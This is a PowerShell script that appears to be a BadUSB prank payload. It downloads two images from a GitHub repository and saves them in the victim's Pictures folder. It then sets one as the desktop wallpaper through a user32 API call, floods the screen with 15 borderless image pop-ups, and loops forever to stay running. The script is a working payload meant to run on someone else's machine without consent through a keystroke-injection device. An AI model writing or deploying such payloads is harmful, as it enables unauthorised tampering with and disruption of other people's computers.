$url1 = 'https://raw.githubusercontent.com/usercode-admin/Badusb-Badble/main/main.png'
$url2 = 'https://raw.githubusercontent.com/usercode-admin/Badusb-Badble/main/main2.png'

$save1 = "$env:USERPROFILE\Pictures\main.png"
$save2 = "$env:USERPROFILE\Pictures\main2.png"
$temp1 = "$env:TEMP\temp1.png"
$temp2 = "$env:TEMP\temp2.png"

Invoke-WebRequest -Uri $url1 -OutFile $temp1
Invoke-WebRequest -Uri $url2 -OutFile $temp2

if (Test-Path $save1) {
    $count = 1
    while (Test-Path "$env:USERPROFILE\Pictures\main_$count.png") { $count++ }
    $save1 = "$env:USERPROFILE\Pictures\main_$count.png"
}
if (Test-Path $save2) {
    $count = 1
    while (Test-Path "$env:USERPROFILE\Pictures\main2_$count.png") { $count++ }
    $save2 = "$env:USERPROFILE\Pictures\main2_$count.png"
}

Move-Item $temp1 $save1 -Force
Move-Item $temp2 $save2 -Force

# wallpaper
$w = @'
using System.Runtime.InteropServices;
namespace Win32 {
    public class Wp {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int a, int p, string l, int f);
    }
}
'@
Add-Type -TypeDefinition $w -ErrorAction SilentlyContinue
[Win32.Wp]::SystemParametersInfo(20, 0, $save1, 3)

# popup
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
for ($i = 0; $i -lt 15; $i++) {
    $f = New-Object System.Windows.Forms.Form
    $f.FormBorderStyle = 'None'
    $f.StartPosition = 'Manual'
    $f.Width = 400
    $f.Height = 500
    $f.Left = (Get-Random -Min 0 -Max ($scr.Width - 400))
    $f.Top = (Get-Random -Min 0 -Max ($scr.Height - 500))
    
    $pb = New-Object System.Windows.Forms.PictureBox
    $pb.Dock = 'Fill'
    $pb.ImageLocation = if ((Get-Random -Min 1 -Max 3) -eq 1) { $save1 } else { $save2 }
    $pb.SizeMode = 'Zoom'
    $f.Controls.Add($pb)
    $f.Show()
    Start-Sleep -Milliseconds 150
}

while ($true) { Start-Sleep 1 }
